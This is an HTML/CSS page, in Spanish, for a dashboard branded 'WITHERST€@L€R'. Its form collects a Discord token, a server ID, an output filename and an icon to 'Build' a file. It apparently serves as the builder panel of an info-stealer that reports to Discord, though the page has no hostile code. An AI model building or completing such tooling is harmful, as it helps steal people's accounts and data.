<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard</title>
    <link rel="stylesheet" href="styles.css">
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #1a1a1a;
            color: white;
            margin: 0;
            padding: 0;
        }
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background-color: #333;
            padding: 20px;
        }
        .logo {
            color: #ff6600;
            font-size: 24px;
            font-weight: bold;
        }
        .nav-buttons {
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
        }
        .nav-buttons a {
            background-color: #c62828;
            color: white;
            padding: 10px 15px;
            text-decoration: none;
            border-radius: 5px;
            margin-left: 10px;
            transition: background-color 0.3s;
            font-weight: bold;
        }
        .nav-buttons a:hover {
            background-color: #d32f2f;
        }
        .register-btn {
            background-color: #ff6600;
            color: white;
            padding: 10px 15px;
            text-decoration: none;
            border-radius: 5px;
            margin-left: 10px;
            transition: background-color 0.3s;
        }
        .register-btn:hover {
            background-color: #e65c00;
        }
        form {
            max-width: 600px;
            margin: 50px auto;
            padding: 20px;
            background-color: #333;
            border-radius: 5px;
        }
        input[type="text"], input[type="file"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #444;
            border-radius: 5px;
            background-color: #222;
            color: white;
        }
        input[type="submit"] {
            background-color: #ff6600;
            color: white;
            border: none;
            border-radius: 5px;
            padding: 10px;
            cursor: pointer;
            font-size: 16px;
        }
        input[type="submit"]:hover {
            background-color: #e65c00;
        }
    </style>
</head>
<body>
    <header>
        <div class="logo">WITHERST€@L€R</div>
        <div class="nav-buttons">
            <a href="/">Home</a> <!-- Botón Home -->
            <a href="/dashboard">Build</a> <!-- Botón Build -->
        </div>
        <div>
            <a href="/" class="register-btn">Cerrar Sesión</a> <!-- Logout directo -->
        </div>
    </header>
    <form method="POST" action="/dashboard" enctype="multipart/form-data">
        <h2>Dashboard de Configuración</h2>
        <input type="text" name="token" placeholder="Token de Discord" required>
        <input type="text" name="server_id" placeholder="ID del Servidor" required>
        <input type="text" name="filename" placeholder="Nombre del archivo" required>
        <input type="file" name="icon" accept=".png, .jpg, .jpeg"> <!-- Archivo de icono opcional -->
        <input type="submit" value="Enviar">
    </form>
</body>
</html>
